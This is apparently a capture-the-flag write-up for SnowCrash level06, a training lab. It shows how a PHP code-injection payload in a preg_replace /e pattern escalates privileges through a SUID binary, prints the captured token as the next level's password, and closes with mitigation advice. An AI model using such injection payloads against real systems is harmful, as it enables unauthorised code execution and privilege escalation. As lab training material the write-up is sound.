# Level06

```
ssh level06@192.168.1.50 -p 4242 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
           _____                      _____               _     
          / ____|                    / ____|             | |    
         | (___  _ __   _____      _| |     _ __ __ _ ___| |__  
          \___ \| '_ \ / _ \ \ /\ / / |    | '__/ _` / __| '_ \ 
          ____) | | | | (_) \ V  V /| |____| | | (_| \__ \ | | |
         |_____/|_| |_|\___/ \_/\_/  \_____|_|  \__,_|___/_| |_|
                                                        
  Good luck & Have fun

          192.168.1.50 
level06@192.168.1.50's 
password: 
level06@SnowCrash:~$ 
```
---

The binary `level06` has the SUID bit enabled:

-rwsr-x--- 1 flag06 level06 level06

This means the program runs with the privileges of the owner (`flag06`).

Using `strings`, I found that the binary executes a PHP script:

/home/user/level06/level06.php

The PHP script contains a vulnerable `preg_replace()` with the `/e` modifier:

$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);

The `/e` modifier evaluates the replacement string as PHP code.

I created a malicious file:

echo '[x ${@system(getflag)}]' > /tmp/exploit

Then I executed:

./level06 /tmp/exploit

The injected PHP code executed `getflag` with `flag06` privileges, giving me the token.

```
level06@SnowCrash:~$ echo '[x ${@system(su flag06)}]' > /tmp/exploit2
level06@SnowCrash:~$ ./level06 /tmp/exploit /tmp/exploit2
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```

---
### Next Password for ssh level07@192.168.1.50 -p 4242

### wiok45aaoguiboiki2tuin6ub

---

## Mitigation

# Level06

The vulnerability is a PHP Code Injection caused by the deprecated `/e` modifier in `preg_replace()`.

The program runs with SUID privileges as `flag06`, and it processes user-controlled input through a PHP script.

By creating a malicious payload:

[x ${@system(getflag)}]

the PHP interpreter evaluates the injected code and executes `getflag` with `flag06` privileges.

- Do not use dangerous evaluation features.
- Never execute user-controlled input as code.
- Validate and sanitize all external inputs.

